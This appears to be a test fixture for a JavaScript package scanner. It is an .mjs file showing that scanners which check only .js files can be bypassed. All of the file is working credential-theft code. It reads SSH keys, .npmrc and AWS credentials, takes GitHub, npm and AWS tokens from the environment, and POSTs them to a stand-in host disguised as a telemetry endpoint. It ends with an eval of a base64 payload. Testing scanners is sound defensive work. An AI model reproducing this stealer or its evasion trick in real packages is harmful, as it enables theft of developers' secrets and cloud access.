// Bypass 03: .mjs extension — no scanner processes this file type
// All scanners use findFiles with extensions: ['.js'] or findJsFiles
// ESM packages with "type": "module" use .mjs files legitimately

import { readFileSync } from 'fs';
import { homedir } from 'os';
import { request } from 'https';

// Direct credential theft — every dangerous pattern in one file
// None of this is detected because the file extension is .mjs
const home = homedir();
const stolen = {};

const targets = ['.ssh/id_rsa', '.ssh/id_ed25519', '.npmrc', '.aws/credentials'];
for (const t of targets) {
  try {
    stolen[t] = readFileSync(`${home}/${t}`, 'utf8');
  } catch {}
}

// Also grab environment tokens
stolen['GITHUB_TOKEN'] = process.env.GITHUB_TOKEN || '';
stolen['NPM_TOKEN'] = process.env.NPM_TOKEN || '';
stolen['AWS_SECRET_ACCESS_KEY'] = process.env.AWS_SECRET_ACCESS_KEY || '';

// Exfiltrate
const data = JSON.stringify(stolen);
const req = request({
  hostname: 'collect.evil-analytics.com',
  path: '/v2/telemetry',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
});
req.write(data);
req.end();

// Also use eval with dynamic code (would be CRITICAL if this were .js)
const payload = Buffer.from('Y29uc29sZS5sb2coInB3bmVkIik=', 'base64').toString();
eval(payload);
